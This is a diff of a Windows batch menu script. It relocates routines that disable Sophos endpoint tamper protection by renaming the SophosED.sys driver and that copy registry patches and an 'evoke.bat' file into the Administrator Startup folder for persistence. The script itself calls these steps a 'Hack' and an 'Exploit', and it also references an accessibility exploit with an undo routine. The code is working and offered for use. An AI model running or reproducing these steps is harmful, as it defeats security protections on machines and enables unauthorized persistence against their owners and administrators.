@@ -212,89 +212,9 @@ pause
 goto menu
 
 
-:disable-sophos-tamper-protection
-cls
-echo Starting Hack...
-if exist "c:\windows\system32\drivers" (  
-  if not exist "C:\windows\system32\drivers\SophosED.sys" (
-    echo SophosED.sys file could not be found & echo.
-    goto :cmdFail
-  )
-  echo Renaming SophosED.sys to SophosED.sys.old
-  ren C:\windows\system32\drivers\SophosED.sys SophosED.sys.old || goto :cmdFail
-  
-  color 0A
-  echo -----------------------------------
-  echo Exploit Completed ^| No errors
-  pause
-  goto menu
-
-
-) else (
-  color 0C
-  echo Could not find System Directory
-  goto :cmdFail
-) 
-goto menu
-
-:sophos-registry-exploit
-cls
-echo Preparing Patch...
-
-set "startupFolder=C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
-set "sophosFolder=X:\sources\sophos"
-set "registryPatch1=!sophosFolder!\1EndpointDefense.reg"
-set "registryPatch2=!sophosFolder!\2SophosMCSAgent.reg"
-set "autorunScript=!sophosFolder!\autorun.bat"
-
-if not exist "!startupFolder!" (
-  echo Could not find Startup folder...
-  echo Failing Registry Patch
-  goto :cmdFail
-)
-
-if not exist "!sophosFolder!" (
-  echo Could not find Sophos folder...
-  echo Failing Registry Patch
-  goto :cmdFail
-)
-
-if not exist "!registryPatch1!" (
-  echo Could not find Registry File number 1...
-  echo Failing Registry Patch
-  goto :cmdFail
-)
-
-if not exist "!registryPatch2!" (
-  echo Could not find Registry File number 2...
-  echo Failing Registry Patch
-  goto :cmdFail
-)
-
-if not exist "!autorunScript!" (
-  echo Could not find the Autorun Script...
-  echo Failing Registry Patch
-  goto :cmdFail
-)
-echo:
-echo Patch files located^! & echo:
-echo Starting Patch...
-
-if not exist C:\SophosUtility (
-  mkdir C:\SophosUtility || goto :cmdFail
-)
-copy "%sophosFolder%" C:\SophosUtility || goto :cmdFail
-copy "C:\SophosUtility\sophos\evoke.bat" "%startupFolder%" || goto :cmdFail
-
-echo -----------------------------------
-echo Sophos Registry Patch Completed ^| No errors
-echo Returning to Menu
-timeout /t 5
-goto menu 
-
 :undo-accessibilty-exploit
 cls
-echo Preparing restore...
+echo Starting Undo...
 if not exist "c:\windows\system32" (
   color 0C
   echo Could not find System Folder
@@ -378,6 +298,87 @@ echo -----------------------------------
 echo Restore Completed ^| No errors
 pause
 goto menu
+
+:disable-sophos-tamper-protection
+cls
+echo Starting Hack...
+if exist "c:\windows\system32\drivers" (  
+  if not exist "C:\windows\system32\drivers\SophosED.sys" (
+    echo SophosED.sys file could not be found & echo.
+    goto :cmdFail
+  )
+  echo Renaming SophosED.sys to SophosED.sys.old
+  ren C:\windows\system32\drivers\SophosED.sys SophosED.sys.old || goto :cmdFail
+  
+  color 0A
+  echo -----------------------------------
+  echo Exploit Completed ^| No errors
+  pause
+  goto menu
+
+
+) else (
+  color 0C
+  echo Could not find System Directory
+  goto :cmdFail
+) 
+goto menu
+
+:sophos-registry-exploit
+cls
+echo Preparing Patch...
+
+set "startupFolder=C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+set "sophosFolder=X:\sources\sophos"
+set "registryPatch1=!sophosFolder!\1EndpointDefense.reg"
+set "registryPatch2=!sophosFolder!\2SophosMCSAgent.reg"
+set "autorunScript=!sophosFolder!\autorun.bat"
+
+if not exist "!startupFolder!" (
+  echo Could not find Startup folder...
+  echo Failing Registry Patch
+  goto :cmdFail
+)
+
+if not exist "!sophosFolder!" (
+  echo Could not find Sophos folder...
+  echo Failing Registry Patch
+  goto :cmdFail
+)
+
+if not exist "!registryPatch1!" (
+  echo Could not find Registry File number 1...
+  echo Failing Registry Patch
+  goto :cmdFail
+)
+
+if not exist "!registryPatch2!" (
+  echo Could not find Registry File number 2...
+  echo Failing Registry Patch
+  goto :cmdFail
+)
+
+if not exist "!autorunScript!" (
+  echo Could not find the Autorun Script...
+  echo Failing Registry Patch
+  goto :cmdFail
+)
+echo:
+echo Patch files located^! & echo:
+echo Starting Patch...
+
+if not exist C:\SophosUtility (
+  mkdir C:\SophosUtility || goto :cmdFail
+)
+copy "%sophosFolder%" C:\SophosUtility || goto :cmdFail
+copy "C:\SophosUtility\sophos\evoke.bat" "%startupFolder%" || goto :cmdFail
+
+echo -----------------------------------
+echo Sophos Registry Patch Completed ^| No errors
+echo Returning to Menu
+timeout /t 5
+goto menu 
+
 
 :cmdFail
 echo ------------------------------------------------
